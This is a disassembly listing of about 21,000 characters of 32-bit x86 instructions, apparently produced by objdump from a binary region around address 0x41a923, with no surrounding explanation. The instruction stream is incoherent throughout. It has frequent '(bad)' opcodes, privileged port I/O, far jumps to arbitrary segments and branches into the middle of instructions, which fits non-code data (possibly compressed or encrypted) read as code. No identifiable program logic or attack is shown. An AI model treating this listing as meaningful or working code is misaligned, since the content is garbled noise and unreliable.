  41a923:	or     eax,0xd1c289ff
  41a928:	popf   
  41a929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a92a:	inc    ecx
  41a92b:	repnz shr cl,1
  41a92e:	sbb    bh,dh
  41a930:	retf   
  41a931:	push   0x1c
  41a933:	xchg   esi,eax
  41a934:	cwde   
  41a935:	sbb    al,0x2d
  41a937:	cmp    DWORD PTR [ecx],esp
  41a939:	mov    cl,0xaf
  41a93b:	dec    eax
  41a93c:	pop    ss
  41a93d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a93e:	je     0x41a95f
  41a940:	pop    ebx
  41a941:	or     al,0xd9
  41a943:	in     al,dx
  41a944:	xor    eax,0x37a24594
  41a949:	retf   0x7dd4
  41a94c:	pop    es
  41a94d:	add    edx,DWORD PTR [eax+0x73e2e40d]
  41a953:	cmp    al,0x2c
  41a955:	add    al,0x8
  41a957:	cld    
  41a958:	loopne 0x41a921
  41a95a:	mov    bh,0xe0
  41a95c:	sub    al,0xea
  41a95e:	xlat   BYTE PTR ds:[ebx]
  41a95f:	call   0xcbac:0xafef107b
  41a966:	or     al,0x93
  41a968:	mov    edi,0x98d86a71
  41a96d:	inc    ecx
  41a96e:	das    
  41a96f:	jl     0x41a961
  41a971:	pop    esi
  41a972:	xchg   edi,eax
  41a973:	and    esi,esi
  41a975:	inc    ebx
  41a976:	pushf  
  41a977:	cmp    eax,0x45af047f
  41a97c:	inc    eax
  41a97d:	arpl   sp,ax
  41a97f:	mov    ecx,0xd19eba45
  41a984:	int    0xae
  41a986:	xchg   esp,eax
  41a987:	add    eax,0x33317b69
  41a98c:	idiv   DWORD PTR [edx]
  41a98e:	push   edx
  41a98f:	repz mov WORD PTR [ebp-0x69],cs
  41a993:	icebp  
  41a994:	inc    edi
  41a995:	push   0x5
  41a997:	iret   
  41a998:	fimul  WORD PTR ss:[eax-0x5c]
  41a99c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a99d:	fist   DWORD PTR [edx-0x3a]
  41a9a0:	mov    DWORD PTR [ebp+0x14cac0b9],ebx
  41a9a6:	scas   eax,DWORD PTR es:[edi]
  41a9a7:	jp     0x41a9e9
  41a9a9:	test   DWORD PTR [edi-0x7c2d2fe2],eax
  41a9af:	xor    ah,BYTE PTR [edi-0x7f7bd9db]
  41a9b5:	dec    eax
  41a9b6:	lea    edx,ds:0x9a516813
  41a9bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9bd:	mov    DWORD PTR [ebx+0x69],0x4266b80a
  41a9c4:	jnp    0x41a975
  41a9c6:	dec    edi
  41a9c7:	xchg   ebx,eax
  41a9c8:	jg     0x41aa3e
  41a9ca:	ret    
  41a9cb:	xchg   DWORD PTR [eax],esp
  41a9cd:	in     al,dx
  41a9ce:	xor    dl,bh
  41a9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9d1:	out    0x50,al
  41a9d3:	fnstenv [ebx+0x41c4ebef]
  41a9d9:	xor    ecx,DWORD PTR [esi-0x2e7112c3]
  41a9df:	xor    dl,BYTE PTR [eax-0x22]
  41a9e2:	xlat   BYTE PTR ds:[ebx]
  41a9e3:	idiv   DWORD PTR [edi-0x53e753fe]
  41a9e9:	or     eax,0xf8ce381a
  41a9ee:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41a9f0:	xchg   edi,eax
  41a9f1:	jle    0x41aa42
  41a9f3:	or     al,0xee
  41a9f5:	std    
  41a9f6:	jo     0x41a9a1
  41a9f8:	aas    
  41a9f9:	adc    bl,BYTE PTR [ebp-0x74]
  41a9fc:	mov    eax,0xc0a8d622
  41aa01:	shr    al,1
  41aa03:	add    ch,bl
  41aa05:	ins    DWORD PTR es:[edi],dx
  41aa06:	jne    0x41a9a9
  41aa08:	jmp    0x3b5a:0x43ba1168
  41aa0f:	lds    edx,FWORD PTR [ebx+0x3e990de2]
  41aa15:	fnstsw WORD PTR [eax+0x19]
  41aa18:	push   cs
  41aa19:	addr16 into 
  41aa1b:	xchg   esi,eax
  41aa1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa1d:	cmp    eax,0x9606a024
  41aa22:	add    BYTE PTR [esi+0x35],0x82
  41aa26:	adc    bh,BYTE PTR [edx]
  41aa28:	retf   
  41aa29:	jb     0x41aa5f
  41aa2b:	loope  0x41a9bf
  41aa2d:	mov    edx,0xd1d0f130
  41aa32:	jmp    0x41a9e3
  41aa34:	imul   edi,DWORD PTR [edx],0xffffffed
  41aa37:	inc    ebx
  41aa38:	fcomp  QWORD PTR ds:0xc6e73340
  41aa3e:	add    BYTE PTR [ebx+eiz*4-0x37],0x11
  41aa43:	test   al,0x45
  41aa45:	scas   al,BYTE PTR es:[edi]
  41aa46:	cmp    DWORD PTR es:[ecx+0x58a504d7],esi
  41aa4d:	sbb    al,BYTE PTR cs:[esi+ebp*8+0x39]
  41aa52:	mov    ebx,0x89672425
  41aa57:	mov    eax,ds:0x3a9fe788
  41aa5c:	xchg   edi,eax
  41aa5d:	push   ecx
  41aa5e:	mov    ebx,0xfa4b7adb
  41aa63:	out    0xd,al
  41aa65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa66:	mov    edi,0x41a8c104
  41aa6b:	lahf   
  41aa6c:	pop    ebp
  41aa6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa6e:	imul   ebx,DWORD PTR ds:0x5fbbe3db,0xbe2f9787
  41aa78:	dec    ecx
  41aa79:	mov    al,ds:0x13f271ab
  41aa7e:	pop    DWORD PTR [eax-0x31fcd3c0]
  41aa84:	std    
  41aa85:	imul   ecx,DWORD PTR [ebx],0x554ab808
  41aa8b:	sub    eax,0x4bc2f7bd
  41aa90:	sub    edi,DWORD PTR [ebp+0x2d]
  41aa93:	dec    BYTE PTR [eax]
  41aa95:	bound  edx,QWORD PTR [ebp-0x7e]
  41aa98:	ror    ecx,0x1e
  41aa9b:	xor    eax,0x15034676
  41aaa0:	or     DWORD PTR [esi+ebx*1-0x4f],esp
  41aaa4:	mov    dl,0x70
  41aaa6:	ds inc ebp
  41aaa8:	or     eax,0x4e6cc166
  41aaad:	and    DWORD PTR [ebx],edi
  41aaaf:	sbb    BYTE PTR [ebp+0x445a1099],bh
  41aab5:	add    eax,0x8964a0d0
  41aaba:	(bad)  
  41aabb:	jmp    0x41ab2a
  41aabd:	mov    dh,0xc9
  41aabf:	sbb    DWORD PTR [esi-0x4217ac1b],esp
  41aac5:	jae    0x41aaf3
  41aac7:	jg     0x41ab3d
  41aac9:	push   ss
  41aaca:	mov    ecx,0x736c68a1
  41aacf:	hlt    
  41aad0:	mov    ah,0x35
  41aad2:	test   eax,0xe8b23686
  41aad7:	add    ch,dl
  41aad9:	pop    ds
  41aada:	das    
  41aadb:	(bad)  
  41aadc:	(bad)  
  41aadd:	mov    ah,0x7a
  41aadf:	sbb    DWORD PTR [edx+ebp*1],ebp
  41aae2:	(bad)  
  41aae3:	outs   dx,BYTE PTR ds:[esi]
  41aae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aae5:	test   BYTE PTR [edx+0x3421b3e6],bh
  41aaeb:	mov    edi,0x5994acd4
  41aaf0:	ds jne 0x41ab18
  41aaf3:	and    BYTE PTR [ebp-0x2a],cl
  41aaf6:	cli    
  41aaf7:	sti    
  41aaf8:	rcl    BYTE PTR [edi-0x1b],0x1d
  41aafc:	fbstp  TBYTE PTR [ebx]
  41aafe:	cmc    
  41aaff:	ins    BYTE PTR es:[edi],dx
  41ab00:	sar    DWORD PTR [ebx],1
  41ab02:	test   DWORD PTR [edi],esp
  41ab04:	aaa    
  41ab05:	xchg   ebx,eax
  41ab06:	cmp    ah,ch
  41ab08:	mov    es,WORD PTR [edx+0x4f]
  41ab0b:	inc    edi
  41ab0c:	retf   0x806c
  41ab0f:	test   al,0xa0
  41ab11:	mov    eax,ds:0x13dd8f65
  41ab16:	idiv   BYTE PTR [ebp+0x12]
  41ab19:	xor    ebx,edi
  41ab1b:	xchg   bx,ax
  41ab1d:	adc    DWORD PTR [esi-0x24b67e4f],0x11
  41ab24:	push   edi
  41ab25:	div    DWORD PTR [ecx-0x5b1147d3]
  41ab2b:	jae    0x41ab23
  41ab2d:	leave  
  41ab2e:	ss sbb al,0x8a
  41ab31:	js     0x41aba2
  41ab33:	fdivr  st,st(4)
  41ab35:	jmp    0x93ff3d71
  41ab3a:	mov    ds:0xa5ae4126,al
  41ab3f:	sub    DWORD PTR [edi-0x56],ebp
  41ab42:	sbb    BYTE PTR [esi],bh
  41ab44:	add    esp,ebp
  41ab46:	pop    edi
  41ab47:	jae    0x41aacc
  41ab49:	push   es
  41ab4a:	dec    ebp
  41ab4b:	push   ds
  41ab4c:	adc    bl,BYTE PTR [edi]
  41ab4e:	lds    ebp,FWORD PTR [esp+ecx*4]
  41ab51:	inc    esi
  41ab52:	clc    
  41ab53:	sar    BYTE PTR [eax-0x15],1
  41ab56:	lods   eax,DWORD PTR ds:[esi]
  41ab57:	mov    BYTE PTR [eax-0x5abd5d1b],bl
  41ab5d:	pusha  
  41ab5e:	push   ecx
  41ab5f:	ds mov ebp,0x60fe2913
  41ab65:	push   esp
  41ab66:	inc    ecx
  41ab67:	mov    eax,ds:0x5528ac94
  41ab6c:	add    DWORD PTR [edi],ebx
  41ab6e:	test   BYTE PTR [edx-0x7b],0x75
  41ab72:	aas    
  41ab73:	add    eax,0xb6727fd7
  41ab78:	add    eax,0xe1f2fb53
  41ab7d:	xchg   ebx,eax
  41ab7e:	retf   0x69df
  41ab81:	mov    ds:0x37af96f4,al
  41ab86:	lods   eax,DWORD PTR ds:[esi]
  41ab87:	loopne 0x41abfc
  41ab89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab8a:	adc    bh,BYTE PTR [edi+0x5e]
  41ab8d:	or     ah,BYTE PTR [ebp-0x1d409faa]
  41ab93:	jb     0x41ab92
  41ab95:	dec    esp
  41ab96:	jmp    0x41ab6a
  41ab98:	or     edi,DWORD PTR [ebp-0x6e]
  41ab9b:	add    BYTE PTR [eax-0x75dae536],0xb1
  41aba2:	inc    ebx
  41aba3:	and    bh,al
  41aba5:	sbb    BYTE PTR [ecx+0x1b],0x3e
  41aba9:	xchg   ebx,eax
  41abaa:	push   0x6d981e72
  41abaf:	mov    edi,0xdabaa952
  41abb4:	cdq    
  41abb5:	sbb    esi,0x3c10e04
  41abbb:	mov    eax,0x9ebc964f
  41abc0:	dec    ebp
  41abc1:	adc    bh,BYTE PTR [ecx+0x40]
  41abc4:	inc    eax
  41abc5:	adc    DWORD PTR [edi-0x51],esp
  41abc8:	int3   
  41abc9:	and    eax,0xa8edc64
  41abce:	xor    ah,cl
  41abd0:	call   0xd59f0eda
  41abd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abd6:	jmp    0x41ac4e
  41abd8:	cdq    
  41abd9:	(bad)  
  41abda:	dec    esp
  41abdb:	aam    0x90
  41abdd:	mov    cl,0x54
  41abdf:	fmul   QWORD PTR [ecx+edi*1+0x6b]
  41abe3:	mov    ds:0xc1aba3bd,eax
  41abe8:	out    0x98,eax
  41abea:	xor    BYTE PTR [esi],bh
  41abec:	mov    dh,0xa6
  41abee:	cmp    ah,dh
  41abf0:	mov    eax,ds:0x7f0b3d10
  41abf5:	jge    0x41abdb
  41abf7:	inc    edx
  41abf8:	in     eax,0xe5
  41abfa:	jno    0x41ab84
  41abfc:	mov    bl,BYTE PTR ds:0x295adecb
  41ac02:	mul    DWORD PTR [esi]
  41ac04:	jmp    0x41ac61
  41ac06:	daa    
  41ac07:	jae    0x41ac10
  41ac09:	shl    BYTE PTR [ecx-0xeacd4d5],0xbe
  41ac10:	mov    edi,DWORD PTR [edi+0x68]
  41ac13:	out    dx,eax
  41ac14:	sbb    eax,0xcacb8816
  41ac19:	fs fwait
  41ac1b:	mov    al,0xea
  41ac1d:	jg     0x41ac52
  41ac1f:	push   esi
  41ac20:	xchg   ebp,eax
  41ac21:	lods   eax,DWORD PTR ds:[esi]
  41ac22:	nop
  41ac23:	push   esp
  41ac24:	scas   eax,DWORD PTR es:[edi]
  41ac25:	dec    esi
  41ac26:	xchg   BYTE PTR [ebx],bh
  41ac28:	xchg   ebx,eax
  41ac29:	cmp    edx,0xffffffeb
  41ac2c:	aad    0x75
  41ac2e:	mov    ebp,0x89ac1462
  41ac33:	pop    esp
  41ac34:	pop    esp
  41ac35:	inc    esp
  41ac36:	xchg   DWORD PTR [ebp-0x2f],ebx
  41ac39:	push   cs
  41ac3a:	fisttp WORD PTR ss:[ecx+0x9]
  41ac3e:	cmp    eax,0xdb2b892
  41ac43:	loope  0x41acbc
  41ac45:	dec    esi
  41ac46:	xchg   esp,eax
  41ac47:	inc    ecx
  41ac48:	pop    ss
  41ac49:	repz cmc 
  41ac4b:	mov    bl,0x5b
  41ac4d:	push   es
  41ac4e:	call   0xbe15b052
  41ac53:	cmp    eax,0x42a3aa50
  41ac58:	mov    bh,0x1b
  41ac5a:	sub    ecx,0xb6b4f6d9
  41ac60:	jge    0x41ac32
  41ac62:	inc    ebp
  41ac63:	js     0x41acbd
  41ac65:	loop   0x41ac2e
  41ac67:	jge    0x41accf
  41ac69:	data16 aas 
  41ac6b:	retf   
  41ac6c:	push   0x964551d1
  41ac71:	fisttp DWORD PTR [eax]
  41ac73:	ret    
  41ac74:	loopne 0x41acb1
  41ac76:	(bad)  
  41ac77:	sub    al,0xbc
  41ac79:	clc    
  41ac7a:	mov    edi,0x421c3e9f
  41ac7f:	bound  ebp,QWORD PTR [edi+ebx*1]
  41ac82:	rcr    DWORD PTR [edx],0xc9
  41ac85:	adc    al,0xb9
  41ac87:	push   eax
  41ac88:	xchg   esi,eax
  41ac89:	outs   dx,BYTE PTR ds:[esi]
  41ac8a:	sub    BYTE PTR [edx-0x2a],bl
  41ac8d:	fild   QWORD PTR [edi-0x32]
  41ac90:	sub    ch,ch
  41ac92:	push   ecx
  41ac93:	outs   dx,DWORD PTR ds:[esi]
  41ac94:	shr    bl,cl
  41ac96:	dec    edx
  41ac97:	jg     0x41ac69
  41ac99:	ret    
  41ac9a:	and    BYTE PTR [ecx-0x28],bl
  41ac9d:	pushf  
  41ac9e:	push   ds
  41ac9f:	arpl   WORD PTR [eax-0x1650f7cc],bx
  41aca5:	sbb    eax,0x80d50792
  41acaa:	js     0x41ac49
  41acac:	push   ecx
  41acad:	adc    BYTE PTR [esi+eiz*1-0x3d],dh
  41acb1:	in     eax,dx
  41acb2:	enter  0xe329,0xa
  41acb6:	inc    esi
  41acb7:	cmp    edi,ebp
  41acb9:	neg    DWORD PTR [ebx-0x7a]
  41acbc:	lods   al,BYTE PTR ds:[esi]
  41acbd:	dec    eax
  41acbe:	popa   
  41acbf:	dec    ebx
  41acc0:	ret    
  41acc1:	and    dh,BYTE PTR [edi]
  41acc3:	adc    dl,BYTE PTR [ebx+0x11]
  41acc6:	jl     0x41ad30
  41acc8:	rcr    BYTE PTR [edx-0x42],0xc6
  41accc:	fstp   TBYTE PTR [eax]
  41acce:	jmp    0x41aca5
  41acd0:	into   
  41acd1:	pop    ecx
  41acd2:	nop
  41acd3:	xchg   ebp,eax
  41acd4:	fstp   DWORD PTR [ebp-0x340ebadf]
  41acda:	sbb    DWORD PTR [ebx],edi
  41acdc:	inc    ebp
  41acdd:	jne    0x41acb6
  41acdf:	mov    ?,WORD PTR [ebp+0x3d8a2b21]
  41ace5:	lods   eax,DWORD PTR ds:[esi]
  41ace6:	fldenv [ebx-0x1b]
  41ace9:	lock dec ebx
  41aceb:	mov    ecx,0x8b21245f
  41acf0:	and    al,0x3c
  41acf2:	sbb    ecx,DWORD PTR [edx]
  41acf4:	add    eax,ecx
  41acf6:	mov    eax,0x5860d076
  41acfb:	je     0x41ad7c
  41acfd:	mov    dh,0xb8
  41acff:	pushf  
  41ad00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad01:	sub    dh,BYTE PTR [ecx+0x67997d3b]
  41ad07:	lea    ecx,[edx]
  41ad09:	inc    edx
  41ad0a:	mov    BYTE PTR [eax+0x6b],bh
  41ad0d:	rcl    cl,cl
  41ad0f:	fs jecxz 0x41acb2
  41ad12:	or     edi,DWORD PTR [eax]
  41ad14:	pop    edx
  41ad15:	fdiv   st,st(7)
  41ad17:	icebp  
  41ad18:	ret    0x4a53
  41ad1b:	or     esi,DWORD PTR [esi-0x25b1b580]
  41ad21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad22:	cs xchg ecx,eax
  41ad24:	shr    BYTE PTR [ecx],1
  41ad26:	into   
  41ad27:	in     eax,dx
  41ad28:	add    ebx,DWORD PTR [ebp-0x75]
  41ad2b:	shl    DWORD PTR [edx],1
  41ad2d:	xchg   ebx,eax
  41ad2e:	(bad)  
  41ad2f:	lahf   
  41ad30:	xor    BYTE PTR [ebx-0x8],0x7e
  41ad34:	out    dx,al
  41ad35:	loope  0x41adaa
  41ad37:	outs   dx,DWORD PTR ds:[esi]
  41ad38:	ficomp WORD PTR [esi-0x5d]
  41ad3b:	cmp    esp,ecx
  41ad3d:	pause  
  41ad3f:	cmp    eax,0x15408e0b
  41ad44:	je     0x41ad4d
  41ad46:	dec    esp
  41ad47:	mov    dh,0x99
  41ad49:	int3   
  41ad4a:	addr16 and eax,0x4447747
  41ad50:	jne    0x41ad7b
  41ad52:	outs   dx,DWORD PTR ds:[esi]
  41ad53:	rol    DWORD PTR [ebx],0x59
  41ad56:	leave  
  41ad57:	jecxz  0x41ad35
  41ad59:	lahf   
  41ad5a:	(bad)  
  41ad5b:	lock inc ebp
  41ad5d:	jg     0x41ad58
  41ad5f:	mov    esi,0xb618b48a
  41ad64:	xor    eax,0xae32bde1
  41ad69:	adc    cl,BYTE PTR [esi+0x2d]
  41ad6c:	js     0x41ad40
  41ad6e:	std    
  41ad6f:	mov    ds:0xea1357ed,al
  41ad74:	xchg   esp,eax
  41ad75:	xor    ebx,DWORD PTR [esi-0x5d]
  41ad78:	stos   BYTE PTR es:[edi],al
  41ad79:	jge    0x41ade5
  41ad7b:	mov    dh,BYTE PTR [edx+0xd6ecf0]
  41ad81:	mov    esi,0x701225aa
  41ad86:	test   eax,0x3dfadc6
  41ad8b:	fdiv   DWORD PTR [edi]
  41ad8d:	leave  
  41ad8e:	arpl   cx,dx
  41ad90:	push   ss
  41ad91:	data16 jge 0x41ad73
  41ad94:	cmp    ebx,DWORD PTR [edi+0x7e11b136]
  41ad9a:	cmp    ecx,ebx
  41ad9c:	repz adc al,BYTE PTR [edx-0x4a]
  41ada0:	mov    al,0xe6
  41ada2:	dec    eax
  41ada3:	push   esi
  41ada4:	call   0xcffa:0x1c08d6fd
  41adab:	add    eax,0x3811e06a
  41adb0:	jo     0xeb14250f
  41adb6:	xchg   edi,eax
  41adb7:	sub    al,0x83
  41adb9:	(bad)  
  41adbb:	jne    0x41ad92
  41adbd:	push   ds
  41adbe:	jmp    FWORD PTR [edx-0x46]
  41adc1:	sbb    DWORD PTR [ebx-0x4e98007f],0x4824cc21
  41adcb:	pop    ebp
  41adcc:	add    eax,0x7ba73153
  41add1:	test   al,0x2e
  41add3:	jne    0x41ade5
  41add5:	fcom   DWORD PTR [ecx+0x23]
  41add8:	dec    esp
  41add9:	aam    0x28
  41addb:	jle    0x41ad69
  41addd:	stc    
  41adde:	sahf   
  41addf:	xchg   BYTE PTR [ebx],cl
  41ade1:	xchg   edx,eax
  41ade2:	jmp    0x41ad87
  41ade4:	mov    fs,WORD PTR [esi+esi*2-0x3133833b]
  41adeb:	inc    eax
  41adec:	sub    al,0xea
  41adee:	bnd jno 0x41ae07
  41adf1:	inc    edx
  41adf2:	dec    edx
  41adf3:	in     eax,dx
  41adf4:	xchg   edi,eax
  41adf5:	xor    ebp,ebp
  41adf7:	pushf  
  41adf8:	ins    BYTE PTR es:[edi],dx
  41adf9:	es inc edx
  41adfb:	test   DWORD PTR ds:0x3725b7ba,eax
  41ae01:	pop    ds
  41ae02:	cdq    
  41ae03:	call   FWORD PTR [edi+0x13f5820b]
  41ae09:	(bad)  
  41ae0a:	mov    al,BYTE PTR [ecx]
  41ae0c:	and    esp,DWORD PTR [edx]
  41ae0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae0f:	pop    ebp
  41ae10:	jp     0x41adb7
  41ae12:	ror    dl,cl
  41ae14:	(bad)  
  41ae15:	shl    ebp,1
  41ae17:	sbb    bh,al
  41ae19:	or     eax,DWORD PTR [ecx-0x21]
  41ae1c:	call   0xa1188380
  41ae21:	(bad)  
  41ae22:	and    ebp,DWORD PTR ds:0x1dda7607
  41ae28:	jnp    0x41aea6
  41ae2a:	cmc    
  41ae2b:	sbb    ebx,DWORD PTR [ebx]
  41ae2d:	popf   
  41ae2e:	cmp    esi,DWORD PTR [edi+0xe]
  41ae31:	cmc    
  41ae32:	pop    edi
  41ae33:	ins    BYTE PTR es:[edi],dx
  41ae34:	mov    bl,0x32
  41ae36:	neg    BYTE PTR [esi-0x3f52129c]
  41ae3c:	adc    al,0x3f
  41ae3e:	mov    DWORD PTR [ebx],0xea352e2c
  41ae44:	dec    ebx
  41ae45:	mov    ds:0x3a811caa,eax
  41ae4a:	dec    ecx
  41ae4b:	jbe    0x41ade0
  41ae4d:	call   0xf81d3099
  41ae52:	xchg   edi,eax
  41ae53:	jbe    0x41ae86
  41ae55:	push   ds
  41ae56:	in     al,0xc4
  41ae58:	push   esp
  41ae59:	mov    bh,0x3a
  41ae5b:	popa   
  41ae5c:	xor    al,al
  41ae5e:	sbb    bh,BYTE PTR [eax]
  41ae60:	(bad)  
  41ae62:	pop    edx
  41ae63:	adc    eax,0x7a218755
  41ae68:	xchg   edx,eax
  41ae69:	pop    ebp
  41ae6a:	jl     0x41aeaf
  41ae6c:	xlat   BYTE PTR ds:[ebx]
  41ae6d:	and    ch,BYTE PTR [edx-0x6]
  41ae70:	mov    ecx,0xd2f7ebb2
  41ae75:	test   BYTE PTR [esp+ebp*8],0x57
  41ae79:	aas    
  41ae7a:	xchg   esi,eax
  41ae7b:	enter  0x6fbb,0x22
  41ae7f:	sar    BYTE PTR [eax],1
  41ae81:	test   eax,0x9d43184e
  41ae86:	inc    ebp
  41ae87:	stos   BYTE PTR es:[edi],al
  41ae88:	pop    esp
  41ae89:	jbe    0x41aed0
  41ae8b:	sar    BYTE PTR [ebx],1
  41ae8d:	jmp    0x1d01:0x12e099f9
  41ae94:	xchg   esi,eax
  41ae95:	scas   al,BYTE PTR es:[edi]
  41ae96:	shl    BYTE PTR [edi+0x42bd66dc],1
  41ae9c:	mov    dl,0x87
  41ae9e:	push   ds
  41ae9f:	out    0x10,al
  41aea1:	addr16 mov edx,0xc9b09da
  41aea7:	dec    eax
  41aea8:	ds pop ds
  41aeaa:	lds    edx,FWORD PTR [esi-0x276a8f4f]
  41aeb0:	test   BYTE PTR [esp+esi*8-0x40],bh
  41aeb4:	into   
  41aeb5:	or     ebp,esi
  41aeb7:	lds    edx,FWORD PTR [eax]
  41aeb9:	sbb    eax,0xd2ede2e3
  41aebe:	pop    esi
  41aebf:	pushf  
  41aec0:	test   al,0xf9
  41aec2:	retf   0x6616
  41aec5:	or     DWORD PTR [edx-0x2f86ea5],0x16
  41aecc:	mov    ebx,0xf391c686
  41aed1:	jno    0x41af4c
  41aed3:	mov    WORD PTR cs:[ecx+0xb9f3f29],fs
  41aeda:	imul   edx,DWORD PTR [ebp-0x79ee86a2],0x9a12bbc0
  41aee4:	xchg   DWORD PTR [ecx],edi
  41aee6:	mov    ds:0xe7494346,al
  41aeeb:	sbb    BYTE PTR [edx-0x70],0xd6
  41aeef:	hlt    
  41aef0:	arpl   ax,cx
  41aef2:	cmp    BYTE PTR [eax+0x10],0x5e
  41aef6:	in     eax,dx
  41aef7:	into   
  41aef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aef9:	hlt    
  41aefa:	out    0xd9,al
  41aefc:	(bad)  
  41aefe:	stos   DWORD PTR es:[edi],eax
  41aeff:	push   ss
  41af00:	sub    dl,BYTE PTR [ecx]
  41af02:	gs aaa 
  41af04:	(bad)  
  41af05:	mov    ebp,DWORD PTR [esi+eiz*2]
  41af08:	jecxz  0x41af25
  41af0a:	icebp  
  41af0b:	pop    edi
  41af0c:	jge    0x41aebe
  41af0e:	sahf   
  41af0f:	mov    cl,0x16
  41af11:	add    al,0x3e
  41af13:	(bad)  
  41af14:	push   edi
  41af15:	xor    al,0xf8
  41af17:	js     0x41af0e
  41af19:	stc    
  41af1a:	arpl   bx,si
  41af1c:	and    al,0xa8
  41af1e:	aas    
  41af1f:	mov    ebp,0x73e69ff4
  41af24:	cwde   
  41af25:	(bad)  
  41af26:	sar    BYTE PTR [ecx+0x35f24fff],cl
  41af2c:	sbb    ch,BYTE PTR [ecx]
  41af2e:	sbb    al,0x7a
  41af30:	add    esp,DWORD PTR [ebx-0x4c21da7d]
  41af36:	mov    al,0x35
  41af38:	jne    0x41af75
  41af3a:	sbb    BYTE PTR [esi-0x1150bcc0],dl
  41af40:	adc    eax,0x104025dc
  41af45:	mov    esp,DWORD PTR ds:0xaf39c4f0
  41af4b:	mov    esp,0x326aa1d5
  41af50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af51:	mov    edi,0x2cd6c7d9
  41af56:	daa    
  41af57:	pop    es
  41af58:	mov    eax,0x59240d39
  41af5d:	iret   
  41af5e:	add    DWORD PTR [eax],eax
  41af60:	mov    bl,0x55
  41af62:	adc    dl,dl
  41af64:	aad    0x5c
  41af66:	sub    bl,BYTE PTR [ebx+0x1c4f7e5]
  41af6c:	test   BYTE PTR [edi+eax*8],ah
  41af6f:	mov    ebx,0x78405d81
  41af74:	sub    eax,0x1d71ea39
  41af79:	adc    edx,ebp
  41af7b:	(bad)  [eax+edi*2-0x1e531be0]
  41af82:	pop    esp
  41af83:	popw   ds
  41af85:	xor    BYTE PTR [edi+0x6e],al
  41af88:	or     DWORD PTR [edi-0x18737dc0],ecx
  41af8e:	lahf   
  41af8f:	or     dl,BYTE PTR [edi+0x1a26a369]
  41af95:	pusha  
  41af96:	stos   DWORD PTR es:[edi],eax
  41af97:	or     eax,0x77b3e6b
  41af9c:	inc    esp
  41af9d:	pop    ebp
  41af9e:	or     al,0xcf
  41afa0:	jo     0x41af3b
  41afa2:	test   eax,0x91fab037
  41afa7:	outs   dx,BYTE PTR ds:[esi]
  41afa8:	daa    
  41afa9:	push   edx
  41afaa:	lods   al,BYTE PTR ds:[esi]
  41afab:	mov    cl,al
  41afad:	push   0xa958b05a
  41afb2:	dec    ebx
  41afb3:	pop    esp
  41afb4:	sub    eax,0x6a2a6dd2
  41afb9:	xchg   ebp,eax
  41afba:	add    ecx,DWORD PTR [ebp-0x2b75d066]
  41afc0:	shl    BYTE PTR [esi+0x7],1
  41afc3:	rcr    DWORD PTR [edx+0x34e0ecd6],0x85
  41afca:	imul   esi,DWORD PTR [ecx-0x2d56e506],0x3b
  41afd1:	sbb    BYTE PTR [edx+edi*1+0x2b3d9246],0xdd
  41afd9:	in     al,0x0
  41afdb:	loop   0x41af7e
  41afdd:	fcom   DWORD PTR [edi+0x6c]
  41afe0:	or     DWORD PTR [ebp-0x67],ecx
  41afe3:	jmp    0xb638d3b3
  41afe8:	mov    ds:0x139162fe,eax
  41afed:	ss jp  0x41b063
  41aff0:	push   esi
  41aff1:	cli    
  41aff2:	mov    eax,0x44e7a686
  41aff7:	mov    esi,0xcabc5e04
  41affc:	or     eax,0x393521de
  41b001:	mov    al,ds:0xe1c12543
  41b006:	pop    esi
  41b007:	jne    0x41b02b
  41b009:	xchg   BYTE PTR [edi-0xef205b3],dl
  41b00f:	jae    0x41afa2
  41b011:	js     0x41afec
  41b013:	sub    esi,DWORD PTR [edx*8-0x6c33b228]
  41b01a:	or     eax,0x970f3325
  41b01f:	js     0x41b017
  41b021:	or     cl,bl
  41b023:	sub    eax,0x219717b2
  41b028:	inc    ebx
  41b029:	adc    al,0x3f
  41b02b:	inc    ebp
  41b02c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b02d:	dec    edi
  41b02e:	push   ss
  41b02f:	loope  0x41b081
  41b031:	push   cs
  41b032:	stc    
  41b033:	inc    esp
  41b034:	add    ebx,ebx
  41b036:	lods   al,BYTE PTR ds:[esi]
  41b037:	or     al,0x2e
  41b039:	push   ecx
  41b03a:	jne    0x41b076
  41b03c:	mov    ds:0xd78b9581,al
  41b041:	jnp    0x41afe6
  41b043:	(bad)  
  41b044:	ins    DWORD PTR es:[edi],dx
  41b045:	mov    al,0x9d
  41b047:	or     eax,0x7d
  41b04a:	iret   
  41b04b:	repz pop ebp
  41b04d:	mov    ecx,DWORD PTR [eax+0x41]
  41b050:	retf   
  41b051:	push   es
  41b052:	addr16 fcmovnu st,st(4)
  41b055:	retf   0x6ad5
  41b058:	mov    ds:0x909a4464,al
  41b05d:	inc    ebx
  41b05e:	push   esp
  41b05f:	jbe    0x41b089
  41b061:	pushf  
  41b062:	shl    BYTE PTR [edi+0x1888b92e],0xce
  41b069:	popf   
  41b06a:	xchg   ebp,eax
  41b06b:	dec    eax
  41b06c:	sar    BYTE PTR [edx],cl
  41b06e:	xchg   edx,eax
  41b06f:	pushf  
  41b070:	cmp    dh,BYTE PTR [esp+edi*2]
  41b073:	fsub   QWORD PTR [edi+eiz*4-0x4a]
  41b077:	call   0x684ee50a
  41b07c:	push   ebx
  41b07d:	xchg   esp,eax
  41b07e:	dec    esi
  41b07f:	xor    eax,0xe83b367
  41b084:	in     eax,dx
  41b085:	jns    0x41b0fc
  41b087:	jl     0x41b032
